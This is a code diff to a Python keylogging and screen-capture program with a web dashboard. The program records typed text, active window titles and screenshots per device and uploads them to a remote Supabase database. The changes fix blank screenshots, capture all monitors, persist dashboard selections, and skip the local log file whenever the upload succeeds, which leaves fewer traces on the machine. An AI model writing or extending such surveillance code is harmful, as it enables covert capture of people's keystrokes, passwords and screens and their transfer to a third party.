@@ -4,6 +4,12 @@ import time
 import socket
 import ctypes
 import threading
+
+# Set process DPI awareness to resolve blank/black screenshots on scaled displays
+try:
+    ctypes.windll.user32.SetProcessDPIAware()
+except Exception:
+    pass
 import uuid
 from datetime import datetime, timezone
 
@@ -632,10 +638,10 @@ HTML_TEMPLATE = """<!DOCTYPE html>
     </div>
     
     <script>
-        let currentTab = 'logs-tab';
-        let selectedDate = '';
-        let selectedSort = 'asc';
-        let selectedDevice = '';
+        let currentTab = localStorage.getItem('currentTab') || 'logs-tab';
+        let selectedDate = localStorage.getItem('selectedDate') || '';
+        let selectedSort = localStorage.getItem('selectedSort') || 'asc';
+        let selectedDevice = localStorage.getItem('selectedDevice') || '';
         let allDevices = [];
         
         // Track selected items across updates
@@ -651,6 +657,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             document.getElementById(tabId).classList.add('active');
             btn.classList.add('active');
             currentTab = tabId;
+            localStorage.setItem('currentTab', tabId);
         }
         
         function openImage(src, filename) {
@@ -704,6 +711,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         
         function changeSort(sortOrder) {
             selectedSort = sortOrder;
+            localStorage.setItem('selectedSort', sortOrder);
             fetchLogs();
             fetchScreenshots();
         }
@@ -758,7 +766,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 allDevices = devices;
                 const select = document.getElementById('device-select');
                 
-                const prevSelection = select.value || selectedDevice;
+                const prevSelection = localStorage.getItem('selectedDevice') || select.value || selectedDevice;
                 
                 select.innerHTML = '';
                 devices.forEach(dev => {
@@ -775,6 +783,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                         selectedDevice = devices[0].device_id;
                     }
                     select.value = selectedDevice;
+                    localStorage.setItem('selectedDevice', selectedDevice);
                 }
                 updateMonitoringButton();
             } catch (err) {
@@ -784,6 +793,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         
         function changeDevice(deviceId) {
             selectedDevice = deviceId;
+            localStorage.setItem('selectedDevice', deviceId);
             selectedLogKeys.clear();
             selectedScreenshotFilenames.clear();
             updateMonitoringButton();
@@ -823,7 +833,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 const dates = await res.json();
                 const select = document.getElementById('date-select');
                 
-                const prevSelection = select.value || selectedDate;
+                const prevSelection = localStorage.getItem('selectedDate') || select.value || selectedDate;
                 
                 select.innerHTML = '';
                 dates.forEach(date => {
@@ -840,6 +850,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                         selectedDate = dates[0];
                     }
                     select.value = selectedDate;
+                    localStorage.setItem('selectedDate', selectedDate);
                 } else {
                     selectedDate = '';
                 }
@@ -850,6 +861,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         
         function changeDate(date) {
             selectedDate = date;
+            localStorage.setItem('selectedDate', date);
             selectedLogKeys.clear();
             selectedScreenshotFilenames.clear();
             fetchLogs();
@@ -1167,6 +1179,15 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         
         // Initial load
         async function init() {
+            // Restore active tab
+            if (currentTab === 'screenshots-tab') {
+                const btn = document.querySelector('button[onclick*="screenshots-tab"]');
+                if (btn) switchTab('screenshots-tab', btn);
+            }
+            // Restore sort select if it exists in UI
+            const sortSelect = document.querySelector('.sort-select');
+            if (sortSelect) sortSelect.value = selectedSort;
+            
             await fetchDevices();
             await fetchDates();
             fetchLogs();
@@ -1710,7 +1731,8 @@ def capture_and_upload_screenshot(prefix):
     
     # 2. Grab and compress as WebP
     try:
-        screenshot = ImageGrab.grab()
+        # Capture all screens to prevent black screenshot bugs on virtual or multi-monitor configurations
+        screenshot = ImageGrab.grab(all_screens=True)
         screenshot.save(local_path, "WEBP", quality=60)
     except Exception as e:
         print(f"Failed to capture or save screenshot: {e}")
@@ -1751,6 +1773,8 @@ def write_log(timestamp, window_title, line_str, screenshot_url=None, screenshot
     if is_monitoring_disabled:
         return
     device_id = get_device_id()
+    supabase_success = False
+    
     # 1. Database logging (if Supabase is initialized)
     if supabase is not None:
         try:
@@ -1765,33 +1789,35 @@ def write_log(timestamp, window_title, line_str, screenshot_url=None, screenshot
                 "screenshot_filename": screenshot_filename
             }
             supabase.table("activity_logs").insert(data).execute()
+            supabase_success = True
         except Exception as e:
             print(f"Failed to insert log to Supabase DB: {e}")
 
     # 2. Local Fallback/Backup logging
-    try:
-        date_str = datetime.now().strftime("%Y-%m-%d")
-        log_file = os.path.join("logs", f"log_{date_str}.txt")
-        root_log = "log.txt"
-        
-        block = [
-            f"--- {timestamp} ---",
-            f"Device ID    : {device_id}",
-            f"Active Window: {window_title}",
-            f"Typed Text   : {line_str}",
-            f"Screenshot   : {screenshot_url if screenshot_url else 'None'}",
-            f"Screenshot File: {screenshot_filename if screenshot_filename else 'None'}",
-            "----------------------------------------",
-            ""
-        ]
-        block_text = "\n".join(block) + "\n"
-        
-        with open(log_file, "a", encoding="utf-8") as f:
-            f.write(block_text)
-        with open(root_log, "a", encoding="utf-8") as f:
-            f.write(block_text)
-    except Exception as e:
-        print(f"Failed to write local fallback log: {e}")
+    if not supabase_success:
+        try:
+            date_str = datetime.now().strftime("%Y-%m-%d")
+            log_file = os.path.join("logs", f"log_{date_str}.txt")
+            root_log = "log.txt"
+            
+            block = [
+                f"--- {timestamp} ---",
+                f"Device ID    : {device_id}",
+                f"Active Window: {window_title}",
+                f"Typed Text   : {line_str}",
+                f"Screenshot   : {screenshot_url if screenshot_url else 'None'}",
+                f"Screenshot File: {screenshot_filename if screenshot_filename else 'None'}",
+                "----------------------------------------",
+                ""
+            ]
+            block_text = "\n".join(block) + "\n"
+            
+            with open(log_file, "a", encoding="utf-8") as f:
+                f.write(block_text)
+            with open(root_log, "a", encoding="utf-8") as f:
+                f.write(block_text)
+        except Exception as e:
+            print(f"Failed to write local fallback log: {e}")
 
 def on_press(key):
     global current_line, last_activity_time
